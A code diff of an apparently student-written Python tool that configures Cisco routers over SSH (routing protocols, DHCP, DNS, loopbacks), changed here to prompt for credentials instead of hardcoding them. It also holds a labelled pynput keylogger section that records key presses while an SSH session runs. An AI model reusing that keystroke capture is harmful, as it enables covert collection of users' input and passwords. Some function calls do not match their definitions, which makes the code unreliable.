@@ -2,6 +2,7 @@ from netmiko import ConnectHandler
 from netmiko.ssh_exception import NetMikoTimeoutException, AuthenticationException
 from pynput import keyboard
 from napalm import get_network_driver
+from getpass import getpass
 
 #----------------------------------keylogger------------------------------------#
 
@@ -57,12 +58,12 @@ def on_press(key):
         # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
         text += str(key).strip("'")
     #---------------------------------------ssh-connection-----------------------------------------------#
-def ssh_connection(ip_address):
+def ssh_connection(ip_address,username,password):
     iosv_l2 = {
         'device_type': 'cisco_ios',
         'ip': ip_address,
-        'username': 'safouat',
-        'password': 'cisco',
+        'username': username,
+        'password': password,
     }
     try:
         connection = ConnectHandler(**iosv_l2)
@@ -80,10 +81,10 @@ def ssh_connection(ip_address):
 
 
     #-----------------------------------enable_keylogger---------------------------------------------#
-def enable_keylog():
+def enable_keylog(username,password):
 
 # Start the SSH connection
-   connection = ssh_connection(ip_address)
+   connection = ssh_connection(ip_address,username,password)
 
    if connection:
     # Start the keyboard listener in a separate thread
@@ -96,14 +97,14 @@ def enable_keylog():
     # Joining the listener thread, which will run as long as the program is running.
     listener.join()
        #-----------DATA INFORMATION ABOUT ROUTER--------------#
-def data_device(ip):
+def data_device(ip,username,password):
     devices = [ip]
 
     driver = get_network_driver('ios')
 
     for device in devices:
         try:
-            iou1 = driver(device, "safouat", "cisco")
+            iou1 = driver(device, username, password)
             iou1.open()
 
             facts = iou1.get_facts()
@@ -147,9 +148,9 @@ def construct_LOOPBACKLIST():
 
     return router_graph
 
-def LOOPBACK_CONFIGURATION(L):
+def LOOPBACK_CONFIGURATION(L,username,password):
     for name, details in L.items():  # Utilisez items() pour itérer sur les noms et les détails.
-        router = ssh_connection(details['ip'])  # Utilisez l'adresse IP du détail du dispositif.
+        router = ssh_connection(details['ip'],username,password)  # Utilisez l'adresse IP du détail du dispositif.
         config_commands = [
             "interface Loopback0",  # Utilisez "Loopback0" au lieu de "l0".
             f"ip address {details['loopback']} 255.255.255.255"
@@ -177,8 +178,8 @@ def construct_router_graphS():
         ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()
 
     return router_graph
-def staticRoute(ip_address_device, network_to_reach, next_hop, subnetMask):
-    connection = ssh_connection(ip_address_device)
+def staticRoute(ip_address_device, network_to_reach, next_hop, subnetMask,username,password):
+    connection = ssh_connection(ip_address_device,username,password)
     config_commands = [f'ip route {network_to_reach} {subnetMask} {next_hop}']
     output = connection.send_config_set(config_commands)
     # If you want to retrieve the output of the executed command, you can do it here.
@@ -201,8 +202,8 @@ def construct_router_graphRIP():
     return router_graph
 
 
-def configure_rip(ip_address_device, L):
-    router = ssh_connection(ip_address_device)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
+def configure_rip(ip_address_device, L,username,password):
+    router = ssh_connection(ip_address_device,username,password)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
     config_commands = [
         "router rip",
          "version 2",  # Replace 1 with your desired RIP process number
@@ -217,8 +218,8 @@ def configure_rip(ip_address_device, L):
 
 
 #-----------------------EIGRP CONFIGURATION---------------------------#
-def configure_eigrp_all_interfaces(ip_address_device,n):
-    router = ssh_connection(ip_address_device)
+def configure_eigrp_all_interfaces(ip_address_device,n,username,password):
+    router = ssh_connection(ip_address_device,username,password)
     config_commands = [
        f"router eigrp {n}",  # Remplacez 1 par votre num      ro de processus EIGRP souhait
         "network 0.0.0.0 255.255.255.255"
@@ -246,8 +247,8 @@ def construct_router_graphEIGRP_OSPF():
     return router_graph
 
 
-def configure_eigrp(ip_address_device, L,A,n):
-    router = ssh_connection(ip_address_device)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
+def configure_eigrp(ip_address_device, L,A,n,username,password):
+    router = ssh_connection(ip_address_device,username,password)  # Assuming you have implemented ssh_connection() to establish an SSH connection.
     config_commands = [
         f"router eigrp {n}",
           # Replace 1 with your desired RIP process number
@@ -276,8 +277,8 @@ def list_of_area():
         ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()
 
     return router_graph
-def configure_OSPF(ip_address_device, loopback,process_number, L, A):
-    router = ssh_connection(ip_address_device)
+def configure_OSPF(ip_address_device, loopback,process_number, L, A,username,password):
+    router = ssh_connection(ip_address_device,username,password)
     
 
     config_commands = [
@@ -293,8 +294,8 @@ def configure_OSPF(ip_address_device, loopback,process_number, L, A):
     print(output)
 
 #--------------------------DHCP Configuration----------------------------------------#
-def dhcp_configuration(ip_address_device,low_address,high_address,poolname,ip_add,length,ipAdd,domainName,hop_address_dhcp):
-    router = ssh_connection(ip_address_device)
+def dhcp_configuration(ip_address_device,low_address,high_address,poolname,ip_add,length,ipAdd,domainName,hop_address_dhcp,username,password):
+    router = ssh_connection(ip_address_device,username,password)
     choice = input('Do you want to be? (server,client,relay agent): ').lower()
     if choice=='server':
           config_commands = [
@@ -341,8 +342,8 @@ def list_of_host():
         ask = input("\nDo you want to add more devices? Answer with 'y' or 'n': ").lower()
 
     return dns
-def dns_configuration(ip_add_device,ip_add_server,domainName,hostname,ip_add):
-    router = ssh_connection(ip_address_device)
+def dns_configuration(ip_add_device,ip_add_server,domainName,hostname,ip_add,username,password):
+    router = ssh_connection(ip_address_device,username,password)
     config_commands=[
              'ip dns server',
              f'ip host {hostname} {ip_add}',
@@ -375,6 +376,8 @@ if __name__ == "__main__":
         print("===============================================")
 
         choice = input("Enter the number of your choice: ")
+        username = input("Enter the username: ")
+        password = getpass("Enter the password: ")
 
         if choice == "1":
             # Static Routing Configuration
@@ -384,7 +387,7 @@ if __name__ == "__main__":
                 subnetmask = router_info['subnet mask']
                 ip_address = router_info['ip']
                 next_hop = router_info['next_hop']
-                staticRoute(ip_address, destination, next_hop, subnetmask)
+                staticRoute(ip_address, destination, next_hop, subnetmask,username,password)
 
         elif choice == "2":
             # RIP Configuration
@@ -392,7 +395,7 @@ if __name__ == "__main__":
             for router_info in router_graph.values():
                 ip_address = router_info['ip']
                 neighbors = router_info['neighbors']
-                configure_rip(ip_address, neighbors)
+                configure_rip(ip_address, neighbors,username,password)
 
         elif choice == "3":
             # EIGRP Configuration
@@ -400,7 +403,7 @@ if __name__ == "__main__":
             if eigrp_choice == 'no':
                 ip_address_device = input('\nEnter the IP address of the device: ')
                 n = int(input('Enter the number of AS: '))
-                configure_eigrp_all_interfaces(ip_address_device, n)
+                configure_eigrp_all_interfaces(ip_address_device, n,username,password)
             elif eigrp_choice == 'yes':
                 router_graph = construct_router_graphEIGRP_OSPF()
                 n = int(input('Enter the number of AS: '))
@@ -408,7 +411,7 @@ if __name__ == "__main__":
                     ip_address = router_info['ip']
                     neighbors = router_info['neighbors']
                     wildMask = router_info['wildMask']
-                    configure_eigrp(ip_address, neighbors, wildMask, n)
+                    configure_eigrp(ip_address, neighbors, wildMask, n,username,password)
             else:
                 print("Invalid choice.")
 
@@ -422,7 +425,7 @@ if __name__ == "__main__":
                 neighbors = router_info['neighbors']
                 wildMask = router_info['wildMask']
                 loopback = router_info['loopback']
-                configure_OSPF(ip_address, loopback, ip_address, process_number, neighbors, wildMask, n)
+                configure_OSPF(ip_address, loopback, ip_address, process_number, neighbors, wildMask, n,username,password)
 
         elif choice == "5":
             # DHCP Configuration
@@ -435,7 +438,7 @@ if __name__ == "__main__":
             ipAdd = input('Enter the IP address for DNS server: ')
             domainName = input('Enter the domain name: ')
             hop_address_dhcp = input('Enter the IP address for DHCP relay agent (if applicable): ')
-            dhcp_configuration(ip_address_device, low_address, high_address, poolname, ip_add, length, ipAdd, domainName, hop_address_dhcp)
+            dhcp_configuration(ip_address_device, low_address, high_address, poolname, ip_add, length, ipAdd, domainName, hop_address_dhcp,username,password)
 
         elif choice == "6":
             # DNS Configuration
@@ -444,15 +447,15 @@ if __name__ == "__main__":
             domainName = input('Enter the domain name: ')
             hostname = input('Enter the hostname: ')
             ip_add = input('Enter the IP address for the hostname: ')
-            dns_configuration(ip_address_device, ip_add_server, domainName, hostname, ip_add)
+            dns_configuration(ip_address_device, ip_add_server, domainName, hostname, ip_add,username,password)
         
         elif choice == "7":
             # Loopback Configuration
             loopback_list = construct_LOOPBACKLIST()
-            LOOPBACK_CONFIGURATION(loopback_list)
+            LOOPBACK_CONFIGURATION(loopback_list,username,password)
         elif choice == "8":
              ip_address = input("Enter the IP address: ")
-             data_device(ip_address)
+             data_device(ip_address,username,password)
             
         
         elif choice == "9":
